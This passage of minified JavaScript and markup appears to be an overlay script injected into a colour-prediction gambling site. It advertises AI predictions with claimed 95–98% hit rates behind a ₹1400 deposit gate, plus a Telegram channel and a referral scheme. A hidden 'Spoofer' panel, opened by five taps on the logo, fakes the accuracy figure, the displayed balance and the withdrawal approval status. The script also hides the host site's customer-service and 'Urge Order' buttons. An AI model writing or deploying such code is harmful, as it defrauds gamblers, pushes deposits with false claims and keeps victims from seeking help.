rgba(0,0,0,0.7); backdrop-filter: blur(4px); }.pay-confirm-mask.active { opacity: 1; pointer-events: auto; }.pay-confirm-box { position: relative; z-index: 1; width: 100%; max-width: 310px; background: #22224b; border: 1px solid rgba(255,255,255,0.08); border-radius: 20px; padding: 28px 24px 24px; text-align: center; transform: scale(0.95) translateY(10px); transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); box-shadow: 0 20px 40px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.05);}.pay-confirm-mask.active .pay-confirm-box { transform: scale(1) translateY(0); }:host(.light) .pay-confirm-box { background: #fff; border-color: rgba(0,0,0,0.05); box-shadow: 0 20px 40px rgba(0,0,0,0.1); }.pay-conf-icon { width: 48px; height: 48px; margin: 0 auto 16px; color: #c4b5fd; background: rgba(196, 181, 253, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; }.pay-conf-icon svg { width: 24px; height: 24px; }:host(.light) .pay-conf-icon { color: #f95959; background: rgba(249, 89, 89, 0.08); }.pay-conf-ttl { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 8px; letter-spacing: -0.3px; }:host(.light) .pay-conf-ttl { color: #111; }.pay-conf-msg { font-size: 13.5px; color: #8b8ea0; line-height: 1.5; margin-bottom: 28px; }.pay-conf-msg b { color: #fff; font-weight: 600; }:host(.light) .pay-conf-msg { color: #666; }:host(.light) .pay-conf-msg b { color: #f95959; }.pay-conf-acts { display: flex; gap: 12px; }.pay-conf-btn { flex: 1; padding: 12px; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s; border: none; font-family: var(--f); outline: none; }.pay-conf-btn.no { background: rgba(255,255,255,0.05); color: #c8cad0; }:host(.light) .pay-conf-btn.no { background: rgba(0,0,0,0.04); color: #666; }.pay-conf-btn.no:active { background: rgba(255,255,255,0.1); }.pay-conf-btn.yes { background: linear-gradient(90deg, #fb8466, #bd5bd4); color: #fff; box-shadow: 0 4px 12px rgba(189, 91, 212, 0.3); }:host(.light) .pay-conf-btn.yes { background: linear-gradient(90deg, #f95959, #ff8080); box-shadow: 0 4px 12px rgba(249, 89, 89, 0.3); }.pay-conf-btn.yes:active { transform: scale(0.96); box-shadow: 0 2px 8px rgba(189, 91, 212, 0.2); }#spoof-withdrawals-list { display: flex; flex-direction: column; gap: 8px; margin-top: 8px; max-height: 250px; overflow-y: auto; }.w-item { display: flex; flex-direction: column; gap: 8px; padding: 10px; border-radius: 10px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); }:host(.light) .w-item { background: #fafafa; border-color: rgba(0,0,0,0.06); }.w-info { display: grid; grid-template-columns: 1fr auto; gap: 4px; font-size: 11px; }.w-id { font-weight: 600; color: var(--t-title); grid-column: 1; }.w-amt { font-weight: 800; color: #fb8466; text-align: right; grid-column: 2; }:host(.light) .w-amt { color: #f95959; }.w-time { color: var(--t-dim); font-size: 9.5px; }.w-state { font-weight: 700; text-align: right; font-size: 10px; }.status-processing { color: #f5a623; }.status-success { color: #16a34a; }.status-failed { color: #ef4444; }.status-other { color: #8b8ea0; }.w-actions { display: flex; gap: 6px; }.w-actions button { flex: 1; padding: 6px; border: none; border-radius: 6px; font-size: 10px; font-weight: 700; cursor: pointer; transition: all .15s; font-family: var(--f); }.w-actions button:active { transform: scale(.96); }.btn-approve { background: rgba(22, 163, 74, 0.15); color: #22c55e; border: 1px solid rgba(22, 163, 74, 0.3); }.btn-approve:hover { background: rgba(22, 163, 74, 0.25); }.btn-reject { background: rgba(239, 68, 68, 0.15); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }.btn-reject:hover { background: rgba(239, 68, 68, 0.25); }</style><div class="logo"><img src="/assets/png/wingologo-0c200440.png" draggable="false"></div><div class="panel"> <div class="panel-header"> <div class="panel-title"><img src="/assets/png/wingologo-0c200440.png"><span class="brand-name" id="brand-name"></span><span class="ai-badge">AI</span><span class="brand-domain" id="brand-domain"></span></div> <button class="close-btn">✕</button> </div> <div class="panel-body"> <div class="view view-menu active"> <div class="menu-cards"> <button class="menu-card card-pro" id="btn-pro"> <div class="card-icon"><svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg></div> <div class="card-info"> <div class="card-top"><span class="card-name">Pro</span><span class="card-badge badge-pro">Free</span></div> <div class="card-desc">AI-powered predictions</div> </div> <svg class="card-arrow" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg> </button> <button class="menu-card card-vip" id="btn-vip"> <div class="card-icon"><svg viewBox="0 0 24 24"><path d="M5 16L3 5l5.5 5L12 4l3.5 6L21 5l-2 11H5zm-1 3h16v2H4v-2z"/></svg></div> <div class="card-info"> <div class="card-top"><span class="card-name">VIP</span><span class="card-badge badge-vip">Exclusive</span></div> <div class="card-desc">98% accuracy · Telegram</div> </div> <svg class="card-arrow" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg> </button> </div> <div class="status-row"><span class="status-dot"></span>Live · Real-time</div> </div> <div class="view view-vip"> <div class="vip-header"> <button class="back-btn" id="btn-back" aria-label="Back"><svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7"/></svg></button> <span class="vip-header-label">VIP Room</span> <span class="vip-invite-pill"><span class="live-pip"></span>Invite only</span> </div> <div class="vip-hero-card"> <div class="vip-tg-ring"><svg viewBox="0 0 24 24" width="26" height="26" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.28-.02-.12.03-2.02 1.28-5.69 3.77-.54.37-1.03.55-1.47.54-.48-.01-1.4-.27-2.09-.49-.84-.28-1.51-.43-1.45-.91.03-.25.38-.51 1.05-.78 4.12-1.79 6.87-2.97 8.26-3.54 3.93-1.62 4.75-1.9 5.28-1.91.12 0 .37.03.54.17.14.12.18.28.2.47-.01.06.01.24 0 .37z"/></svg></div> <h3 class="vip-title">Signals. Every round.</h3> <p class="vip-pitch">Our members get the signal 15s before each game starts. No noise, no spam — just the edge.</p> </div> <div class="vip-stats"> <div class="vip-stat"><span class="stat-val">95%+</span><span class="stat-lbl">Hit rate</span></div> <div class="vip-stat"><span class="stat-val">20K+</span><span class="stat-lbl">Members</span></div> <div class="vip-stat"><span class="stat-val">Free</span><span class="stat-lbl">Always</span></div> </div> <button class="vip-cta" id="btn-vip-join"> <svg viewBox="0 0 24 24" width="15" height="15" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.28-.02-.12.03-2.02 1.28-5.69 3.77-.54.37-1.03.55-1.47.54-.48-.01-1.4-.27-2.09-.49-.84-.28-1.51-.43-1.45-.91.03-.25.38-.51 1.05-.78 4.12-1.79 6.87-2.97 8.26-3.54 3.93-1.62 4.75-1.9 5.28-1.91.12 0 .37.03.54.17.14.12.18.28.2.47-.01.06.01.24 0 .37z"/></svg> Open Telegram <svg class="vip-arrow" viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg> </button> <p class="vip-note">No account needed · 100% free</p> </div> <div class="view view-settings"> <div class="pro-top"> <button class="back-btn" id="btn-settings-back" aria-label="Back"><svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7"/></svg></button> <span class="settings-header-label">Spoofer Settings</span> </div> <div class="spoofer-card"> <div class="spoofer-section"> <label class="spoofer-label">Prediction Accuracy</label> <div class="spoofer-row"> <input type="range" id="spoof-acc-range" min="0" max="100" step="1" value="100"> <input type="number" id="spoof-acc-num" min="0" max="100" value="100"> <span class="spoofer-unit">%</span> </div> </div> <div class="spoofer-section"> <label class="spoofer-label">Spoof Balance Offset</label> <div class="spoofer-row"> <input type="number" id="spoof-bal" min="0" step="100" value="5000"> <span class="spoofer-unit">₹</span> </div> </div> <button class="spoofer-reset" id="btn-spoof-reset">Reset Defaults</button> </div> <div class="spoofer-card" style="margin-top: 10px;"> <label class="spoofer-label">Withdrawal Requests</label> <div id="spoof-withdrawals-list"></div> </div> </div> <div class="view view-pro"> <div class="pro-top"> <button class="back-btn" id="btn-pro-back" aria-label="Back"><svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7"/></svg></button> <div class="pro-gameinfo"> <div class="pro-gameinfo-row"><span class="pro-game-name" id="pro-mode">—</span><span class="pro-live-badge"><span class="live-pip"></span>Live</span></div> <span class="pro-round" id="pro-period">—</span> </div> </div> <div class="pro-timer-wrap" id="pro-timer-wrap"> <div class="pro-timer-label">Time Remaining</div> <span class="pro-timer" id="pro-timer">00:00</span> </div> <div class="pro-card" id="pro-card"> <div class="pro-scanning" id="pro-waiting"> <div class="scan-rings"><div class="scan-ring-o"></div><div class="scan-ring-i"></div></div> <span class="scan-label" id="scan-lbl">Scanning<span class="s-dot"></span><span class="s-dot"></span><span class="s-dot"></span></span> </div> <div class="pro-prediction" id="pro-prediction" style="display:none"> <div class="streak-badge" id="streak-badge"><span>🔥</span><span id="streak-text">—</span></div> <div class="pred-hero"><div class="pred-glow" id="pred-glow"></div><div class="pred-ball" id="hero-ball"></div></div> <div class="pred-tags"><span class="pred-size" id="pred-pill">Big</span><span class="pred-color" id="pred-color">Red</span></div> <div class="pred-conf"><div class="conf-track"><div class="conf-fill" id="conf-fill"></div></div><span class="conf-pct" id="conf-pct">0%</span></div> <div class="pred-history" id="pred-history"><span class="hist-label">Recent</span></div> </div> </div> </div> </div> <div class="gate-view"> <div class="gate-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg></div> <h3 class="gate-title">Predictions Locked</h3> <div class="gate-bal-wrap"><span class="gate-balance" id="gate-bal">₹0.00</span></div> <p class="gate-desc">Minimum ₹1400 balance required to<br>access real-time predictions.</p> <div class="gate-actions"> <button class="gate-btn btn-deposit">Deposit Now</button> <button class="gate-btn btn-telegram">Join Telegram</button> </div> </div></div><div class="bonus-view" id="bonus-view"> <div class="bonus-hdr"> <button class="bonus-back-btn" id="btn-bonus-back"><svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7"/></svg></button> <span class="bonus-ttl">Referral Bonus</span> </div> <div class="bonus-scroll"> <div class="bonus-hero"> <div class="bonus-hero-icon">💰</div> <h2 class="bonus-h2">Invite &amp; Earn</h2> <p class="bonus-sub">Refer friends and earn commission on every deposit they make. No limits.</p> </div> <div class="bonus-stats-row"> <div class="bonus-stat"><span class="bonus-stat-val">₹1,000</span><span class="bonus-stat-lbl">Per referral</span></div> <div class="bonus-stat"><span class="bonus-stat-val">∞</span><span class="bonus-stat-lbl">No cap</span></div> <div class="bonus-stat"><span class="bonus-stat-val">Instant</span><span class="bonus-stat-lbl">Payout</span></div> </div> <div class="bonus-prog-card"> <div class="bonus-prog-lbl"><span>Your progress</span><span class="bonus-prog-count">0 / 10 Qualified</span></div> <div class="bonus-bar"><div class="bonus-bar-fill"></div></div> </div> <div class="bonus-tiers"> <div class="bonus-section-ttl">Reward Tiers</div> <div class="bonus-tier"><span class="tier-badge t-bronze">5</span><span class="tier-info">5 referrals → <b>₹5,000</b> + Bronze badge</span></div> <div class="bonus-tier"><span class="tier-badge t-silver">10</span><span class="tier-info">10 referrals → <b>₹10,000</b> + Silver badge</span></div> <div class="bonus-tier"><span class="tier-badge t-gold">25</span><span class="tier-info">25 referrals → <b>₹30,000</b> + Gold badge</span></div> <div class="bonus-tier"><span class="tier-badge t-diamond">50</span><span class="tier-info">50 referrals → <b>₹75,000</b> + VIP access</span></div> </div> <button class="bonus-cta-btn" id="btn-copy-invite">Copy Invite Link</button> <div class="bonus-link-preview" id="bonus-link-preview"></div> <div class="bonus-rules"> <div class="bonus-section-ttl">How it works</div> <div class="bonus-rule">1. Share your unique invite link with friends</div> <div class="bonus-rule">2. Friend registers using your link</div> <div class="bonus-rule">3. Friend makes their first deposit (min ₹1400)</div> <div class="bonus-rule">4. Bonus credited instantly to your wallet</div> </div> <div class="bonus-rules"> <div class="bonus-section-ttl">Terms</div> <div class="bonus-rule">• Referral must make a minimum first deposit of ₹1400</div> <div class="bonus-rule">• Self-referral is not permitted</div> <div class="bonus-rule">• Bonus is credited as withdrawable balance</div> <div class="bonus-rule">• Management reserves the right to modify terms</div> </div> </div></div><div class="wg-overlay inactive" id="wg-promo-overlay"></div><div class="wg-popup inactive" id="wg-promo-banner"> <div class="wg-close-x" id="wg-promo-close">✕</div> <div class="wg-pop-hero"> <div class="wg-pop-icon">💰</div> <div class="wg-pop-amount">FREE ₹1,000</div> <div class="wg-pop-pill">Per Referral &bull; No Limit &bull; Instant Payout</div> </div> <div class="wg-pop-stats"> <div class="wg-stat-chip">💸 Instant</div> <div class="wg-stat-chip">♾️ No Cap</div> <div class="wg-stat-chip">✅ Verified</div> </div> <div class="wg-pop-body">Invite friends to join. Every time they deposit, you earn ₹1,000 commission — instantly credited, zero waiting.</div> <button class="wg-pop-cta" id="wg-promo-cta">🎁 Claim Free Bonus →</button> <div class="wg-pop-footer"> <div class="wg-checkbox" id="wg-promo-check" role="checkbox" aria-checked="false"> <div class="wg-checkbox__icon"><span class="wg-check-tick">✓</span></div> </div> <span class="wg-no-remind" id="wg-promo-remind">No more reminders today</span> </div></div>'),
                    (this._logo = e.querySelector(".logo")),
                    (this._panel = e.querySelector(".panel")),
                    (this._header = e.querySelector(".panel-header")),
                    (this._closeBtn = e.querySelector(".close-btn")),
                    (this._gateView = e.querySelector(".gate-view")),
                    (this._body = e.querySelector(".panel-body")),
                    (this._gateBal = e.querySelector("#gate-bal")),
                    vt(this, ht("logo")),
                    (e.querySelector("#brand-name").textContent = Tn),
                    (e.querySelector("#brand-domain").textContent = Dn),
                    Ge(this, this._logo, { onTap: () => this._showPanel() }),
                    Ve(this, this._header, this._panel),
                    this._closeBtn.addEventListener("pointerdown", (e) =>
                        e.stopPropagation(),
                    ),
                    this._closeBtn.addEventListener("click", () => this._showLogo()),
                    e
                        .querySelector(".btn-deposit")
                        .addEventListener("click", () => (location.href = xn)),
                    e
                        .querySelector(".btn-telegram")
                        .addEventListener("click", () =>
                            window.open("https://telegram.dog/PredictWins", "_blank"),
                        ),
                    e.querySelector("#btn-pro").addEventListener("click", () => {
                        (this._setView("pro"), Pe(-1), D("loading"), je());
                    }),
                    e
                        .querySelector("#btn-vip")
                        .addEventListener("click", () => this._setView("vip")),
                    e
                        .querySelector("#btn-back")
                        .addEventListener("click", () => this._setView("menu")),
                    e
                        .querySelector("#btn-pro-back")
                        .addEventListener("click", () => this._setView("menu")),
                    e
                        .querySelector("#btn-vip-join")
                        .addEventListener("click", () =>
                            window.open("https://telegram.dog/PredictWins", "_blank"),
                        ),
                    e
                        .querySelector("#btn-settings-back")
                        .addEventListener("click", () => this._setView("menu")),
                    e
                        .querySelector("#btn-spoof-reset")
                        .addEventListener("click", () => {
                            (window.__wgSpoofer.saveSetting("accuracy", 100),
                                window.__wgSpoofer.saveSetting("balanceOffset", 5e3),
                                window.__wgSpoofer.resetBalance(),
                                this._syncSettings());
                        }));
                let t = [],
                    a = e.querySelector(".panel-title img");
                a.style.pointerEvents = "auto";
                let n = () => {
                    window.__wgSpoofer &&
                        window.__wgSpoofer.isVip() &&
                        (t.push(Date.now()),
                            t.length >= 5 &&
                            (t[t.length - 1] - t[t.length - 5] < 2e3 &&
                                ((t.length = 0),
                                    this._setView("settings"),
                                    this._syncSettings()),
                                t.length > 10 && t.splice(0, t.length - 5)));
                };
                (a.addEventListener(
                    "pointerdown",
                    (e) => {
                        (e.stopImmediatePropagation(), e.stopPropagation());
                    },
                    !0,
                ),
                    a.addEventListener("pointerup", n, !0),
                    a.addEventListener("click", n));
                let r = e.querySelector("#spoof-acc-range"),
                    o = e.querySelector("#spoof-acc-num"),
                    i = e.querySelector("#spoof-bal");
                (r.addEventListener("input", () => {
                    ((o.value = r.value),
                        window.__wgSpoofer.saveSetting("accuracy", parseInt(r.value)));
                }),
                    o.addEventListener("input", () => {
                        ((r.value = o.value),
                            window.__wgSpoofer.saveSetting("accuracy", parseInt(o.value)));
                    }),
                    i.addEventListener("input", () => {
                        (window.__wgSpoofer.saveSetting(
                            "balanceOffset",
                            parseInt(i.value) || 0,
                        ),
                            window.__wgSpoofer.resetBalance());
                    }));
                let s = e.querySelector("#spoof-withdrawals-list");
                s &&
                    s.addEventListener("click", (e) => {
                        let t = e.target.closest("button[data-id]");
                        if (!t) return;
                        let a = t.getAttribute("data-id"),
                            n = t.classList.contains("btn-approve") ? 1 : 0;
                        (window.__wgSpoofer &&
                            window.__wgSpoofer.updateWithdrawalStatus(a, n),
                            this._renderWithdrawals());
                    });
                let l = wt();
                if (l) {
                    let t = e.querySelector("#pro-mode");
                    (t && (t.textContent = Vt(l)), Gt().length || k());
                }
                let d = document.createElement("style");
                ((d.textContent =
                    ".customer,.changlongEnter,.rechargeh__container-content__item-body .van-button{display:none!important}"),
                    document.head.appendChild(d),
                    setInterval(function () {
                        for (
                            var e = document.querySelectorAll(".van-button__text"), t = 0;
                            t < e.length;
                            t++
                        )
                            if ("Urge Order" === e[t].textContent.trim()) {
                                var a = e[t].closest(".van-button,button");
                                a && (a.style.display = "none");
                            }
                    }, 1e3),
                    De(500),
                    Ye());
                let p = () => {
                    let e = document.querySelector("#app");
                    if (!e) return;
                    let t = e.getBoundingClientRect();
                    (this.style.setProperty("--bv-left", t.left + "px"),
                        this.style.setProperty("--bv-width", t.width + "px"));
                };
                (p(), new ResizeObserver(p).observe(document.documentElement));
                let c = (e) => {
                    ("number" == typeof e?.detail?.balance &&
                        (window.__wg_balance = e.detail.balance),
                        this._checkBalance());
                };
                (window.addEventListener("wg-qualified", c),
                    window.addEventListener("wg-balance", c),
                    this._checkBalance());
            }
            _checkBalance() {
                if (sessionStorage.getItem("wg_qualified"))
                    return (
                        (this._body.style.display = "block"),
                        void (this._gateView.style.display = "none")
                    );
                let e = window.__wg_balance || 0;
                if (window.__wgSpoofer && window.__wgSpoofer.isVip())
                    try {
                        let t = JSON.parse(localStorage.getItem("wg_spoof_state"));
                        t && null !== t.balance && (e = t.balance);
                    } catch (e) { }
                ((this._gateBal.textContent = "₹" + Number(e).toFixed(2)),
                    e < 1400
                        ? ((this._body.style.display = "none"),
                            (this._gateView.style.display = "block"))
                        : ((this._body.style.display = "block"),
                            (this._gateView.style.display = "none")));
            }
            _showPanel() {
                ((this._mode = "panel"),
                    (this._logo.style.display = "none"),
                    this._panel.classList.add("active"),
                    this._checkBalance());
                let e = ht("panel");
                e ? vt(this, e) : Ae(this, this._panel);
            }
            _showLogo() {
                ((this._mode = "logo"),
                    this._panel.classList.remove("active"),
                    (this._logo.style.display = "block"),
                    vt(this, ht("logo")));
            }
            _setView(e) {
                this.shadowRoot
                    .querySelectorAll(".view")
                    .forEach((e) => e.classList.remove("active"));
                let t = this.shadowRoot.querySelector(".view-" + e);
                t && t.classList.add("active");
            }
            _syncSettings() {
                if (!window.__wgSpoofer) return;
                let e = window.__wgSpoofer.getSettings(),
                    t = this.shadowRoot;
                ((t.querySelector("#spoof-acc-range").value = e.accuracy),
                    (t.querySelector("#spoof-acc-num").value = e.accuracy),
                    (t.querySelector("#spoof-bal").value = e.balanceOffset),
                    this._renderWithdrawals());
            }
            _renderWithdrawals() {
                if (!window.__wgSpoofer) return;
                let e = window.__wgSpoofer.getWithdrawals(),
                    t = this.shadowRoot.querySelector("#spoof-withdrawals-list");
                if (!t) return;
                t.innerHTML = "";
                let a = [];
                for (let t in e) a.push(e[t]);
                a.sort((e, t) => t.addTime - e.addTime);
                let n = document.createDocumentFragment();
                (a.forEach((e) => {
                    let t = document.createElement("div");
                    t.className = "w-item";
                    let a = "Processing",
                        r = "status-processing";
                    (1 === e.state || 2 === e.state
                        ? ((a = "Success"), (r = "status-success"))
                        : (0 !== e.state && 4 !== e.state) ||
                        ((a = "Failed"), (r = "status-failed")),
                        (t.innerHTML = `<div class="w-info"><div class="w-id">${e.withdrawNumber}</div><div class="w-amt">₹${e.amount}</div><div class="w-time">${new Date(e.addTime).toLocaleString()}</div><div class="w-state ${r}">${a}</div></div><div class="w-actions"><button class="btn-approve" data-id="${e.withdrawNumber}">Approve</button><button class="btn-reject" data-id="${e.withdrawNumber}">Reject</button></div>`),
                        n.appendChild(t));
                }),
                    t.appendChild(n));
            }
        },
    ),
    ["pushState", "replaceState"].forEach((e) => {
        let t = history[e];
        history[e] = function (...e) {
            (t.apply(this, e), bt());
        };
    }),
    window.addEventListener("hashchange", bt),
    setInterval(bt, 1e3),
    setTimeout(bt, 50));
